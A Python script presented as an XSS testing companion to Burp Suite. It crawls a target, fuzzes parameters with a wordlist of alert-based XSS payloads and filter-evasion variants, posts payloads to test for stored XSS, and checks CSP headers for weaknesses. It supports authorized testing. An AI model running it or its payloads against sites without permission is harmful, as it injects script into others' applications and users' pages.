#!/usr/bin/env python3
"""Agent for XSS testing workflows complementing Burp Suite during authorized assessments."""

import requests
import re
import json
import sys
import argparse
import urllib3
from datetime import datetime
from urllib.parse import urljoin, quote, urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

XSS_WORDLIST = [
    '<script>alert(document.domain)</script>',
    '<img src=x onerror=alert(document.domain)>',
    '<svg/onload=alert(document.domain)>',
    '<body onload=alert(document.domain)>',
    '<input onfocus=alert(document.domain) autofocus>',
    '<marquee onstart=alert(document.domain)>',
    '<details open ontoggle=alert(document.domain)>',
    '"><img src=x onerror=alert(document.domain)>',
    "'-alert(document.domain)-'",
    "\\'-alert(document.domain)//",
    '<ScRiPt>alert(document.domain)</sCrIpT>',
    '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
]


def find_reflection_points(base_url, token=None):
    """Crawl pages and find parameters that reflect user input."""
    print("[*] Finding reflection points...")
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    reflections = []
    try:
        resp = requests.get(base_url, headers=headers, timeout=15, verify=False)
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
                           resp.text, re.DOTALL | re.IGNORECASE)
        for action, form_body in forms:
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', form_body, re.IGNORECASE)
            for inp in inputs:
                reflections.append({"url": action or base_url, "param": inp, "method": "GET"})
        links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', resp.text)
        for link in links[:20]:
            parsed = urlparse(link)
            params = dict(p.split("=", 1) for p in parsed.query.split("&") if "=" in p)
            for param in params:
                reflections.append({"url": link.split("?")[0], "param": param, "method": "GET"})
    except requests.RequestException as e:
        print(f"  [-] Error crawling: {e}")
    print(f"  [+] Found {len(reflections)} potential injection points")
    return reflections


def test_character_encoding(url, param, token=None):
    """Test which special characters are reflected unencoded."""
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    test_string = '<>"\'&/`()'
    full_url = f"{url}?{param}={quote(test_string)}"
    try:
        resp = requests.get(full_url, headers=headers, timeout=10, verify=False)
        unencoded = [ch for ch in test_string if ch in resp.text]
        return unencoded
    except requests.RequestException:
        return []


def fuzz_xss_payloads(base_url, param_url, param_name, token=None, payloads=None):
    """Fuzz a parameter with XSS payloads and check for reflection."""
    if payloads is None:
        payloads = XSS_WORDLIST
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    findings = []
    for payload in payloads:
        url = f"{urljoin(base_url, param_url)}?{param_name}={quote(payload)}"
        try:
            resp = requests.get(url, headers=headers, timeout=10, verify=False)
            if payload in resp.text:
                findings.append({
                    "type": "REFLECTED_XSS", "url": param_url, "param": param_name,
                    "payload": payload, "severity": "HIGH",
                })
                print(f"  [!] REFLECTED: {param_name}={payload[:40]}...")
                break
        except requests.RequestException:
            continue
    return findings


def test_stored_xss_endpoints(base_url, endpoints, token):
    """Test stored XSS via common input endpoints."""
    print("\n[*] Testing stored XSS endpoints...")
    findings = []
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    test_payloads = XSS_WORDLIST[:3]

    for ep in endpoints:
        url = urljoin(base_url, ep["submit"])
        for payload in test_payloads:
            try:
                data = {ep.get("field", "body"): payload}
                resp = requests.post(url, headers=headers, json=data, timeout=10, verify=False)
                if resp.status_code in (200, 201):
                    display_url = urljoin(base_url, ep["display"])
                    display_resp = requests.get(display_url, headers=headers, timeout=10, verify=False)
                    if payload in display_resp.text:
                        findings.append({
                            "type": "STORED_XSS", "submit": ep["submit"],
                            "display": ep["display"], "field": ep.get("field", "body"),
                            "payload": payload, "severity": "CRITICAL",
                        })
                        print(f"  [!] STORED XSS: {ep['submit']} -> {ep['display']}")
                        break
            except requests.RequestException:
                continue
    return findings


def analyze_csp(base_url):
    """Analyze CSP header for XSS bypass opportunities."""
    print("\n[*] Analyzing CSP for bypass opportunities...")
    findings = []
    try:
        resp = requests.get(base_url, timeout=10, verify=False)
        csp = resp.headers.get("Content-Security-Policy", "")
        if not csp:
            findings.append({"type": "NO_CSP", "detail": "No CSP header present", "severity": "MEDIUM"})
            print("  [!] No CSP header - inline scripts will execute")
            return findings

        directives = {}
        for part in csp.split(";"):
            part = part.strip()
            if " " in part:
                key, value = part.split(" ", 1)
                directives[key] = value

        script_src = directives.get("script-src", directives.get("default-src", ""))
        weaknesses = []
        if "'unsafe-inline'" in script_src:
            weaknesses.append("unsafe-inline allows inline scripts")
        if "'unsafe-eval'" in script_src:
            weaknesses.append("unsafe-eval allows eval()")
        if "data:" in script_src:
            weaknesses.append("data: URIs allowed in script-src")
        wildcard_domains = re.findall(r'\*\.\S+', script_src)
        if wildcard_domains:
            weaknesses.append(f"Wildcard domains: {wildcard_domains}")

        for w in weaknesses:
            findings.append({"type": "CSP_WEAKNESS", "detail": w, "severity": "HIGH"})
            print(f"  [!] CSP weakness: {w}")
        if not weaknesses:
            print(f"  [+] CSP appears well-configured")
    except requests.RequestException:
        pass
    return findings


def generate_report(findings, output_path):
    """Generate XSS assessment report."""
    report = {
        "assessment_date": datetime.now().isoformat(),
        "total_findings": len(findings),
        "by_severity": {},
        "findings": findings,
    }
    for f in findings:
        s = f.get("severity", "INFO")
        report["by_severity"][s] = report["by_severity"].get(s, 0) + 1
    with open(output_path, "w") as fh:
        json.dump(report, fh, indent=2)
    print(f"\n[*] Report: {output_path} | Findings: {len(findings)}")


def main():
    parser = argparse.ArgumentParser(description="XSS Testing Agent (Burp Suite Companion)")
    parser.add_argument("base_url", help="Base URL of the target")
    parser.add_argument("--token", help="Bearer token for authentication")
    parser.add_argument("--params", nargs="+", help="URL?param pairs to test")
    parser.add_argument("-o", "--output", default="xss_burp_report.json")
    args = parser.parse_args()

    print(f"[*] XSS Testing (Burp Suite Companion): {args.base_url}")
    findings = []
    findings.extend(analyze_csp(args.base_url))
    reflections = find_reflection_points(args.base_url, args.token)
    for ref in reflections[:15]:
        unencoded = test_character_encoding(
            urljoin(args.base_url, ref["url"]), ref["param"], args.token)
        if "<" in unencoded or '"' in unencoded:
            findings.extend(fuzz_xss_payloads(
                args.base_url, ref["url"], ref["param"], args.token))
    generate_report(findings, args.output)


if __name__ == "__main__":
    main()
